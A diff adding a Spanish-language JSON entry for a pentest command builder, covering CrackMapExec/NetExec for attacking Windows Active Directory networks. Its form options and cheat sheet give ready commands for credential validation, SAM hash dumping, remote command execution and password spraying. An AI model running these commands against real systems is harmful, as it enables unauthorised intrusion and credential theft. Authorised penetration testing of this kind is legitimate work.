@@ -1,0 +1,25 @@
+{
+ "id":"crackmapexec","name":"CrackMapExec / NetExec","category":"Post-explotación / Active Directory","binary":"nxc",
+ "summary":"Navaja suiza para atacar redes Windows/AD: validar credenciales, ejecutar comandos, volcar hashes.",
+ "questions":[
+  {"id":"proto","type":"select","label":"Protocolo","options":[
+   {"id":"smb","label":"SMB","frag":"smb"},{"id":"winrm","label":"WinRM","frag":"winrm"},
+   {"id":"ldap","label":"LDAP","frag":"ldap"},{"id":"ssh","label":"SSH","frag":"ssh"}]},
+  {"id":"target","type":"text","label":"IP, rango o fichero de objetivos","placeholder":"10.10.10.0/24","required":true},
+  {"id":"u","type":"text","label":"Usuario","flag":"-u {v}","required":true},
+  {"id":"p","type":"text","label":"Contraseña","flag":"-p {v}","required":true},
+  {"id":"action","type":"select","label":"¿Qué quieres hacer?","options":[
+   {"id":"check","label":"Solo validar credenciales","frag":""},
+   {"id":"sam","label":"Volcar SAM (hashes locales)","frag":"--sam"},
+   {"id":"shares","label":"Listar shares","frag":"--shares"},
+   {"id":"exec","label":"Ejecutar comando","frag":""},
+   {"id":"spray","label":"Password spraying","frag":"--continue-on-success"}]},
+  {"id":"x","type":"text","label":"Comando a ejecutar","flag":"-x \"{v}\"","when":{"action":"exec"},"required":true},
+  {"id":"local_auth","type":"bool","label":"Autenticación local (no AD)","flag":"--local-auth"}
+ ],
+ "cheats":[
+  {"title":"Validar credenciales en rango","cmd":"nxc smb 10.10.10.0/24 -u usuario -p contraseña"},
+  {"title":"Volcar hashes SAM","cmd":"nxc smb TARGET -u admin -p contraseña --sam"},
+  {"title":"Ejecutar comando","cmd":"nxc smb TARGET -u admin -p contraseña -x \"whoami\""},
+  {"title":"Password spraying","cmd":"nxc smb TARGET -u users.txt -p 'Winter2024!' --continue-on-success"}
+ ]}
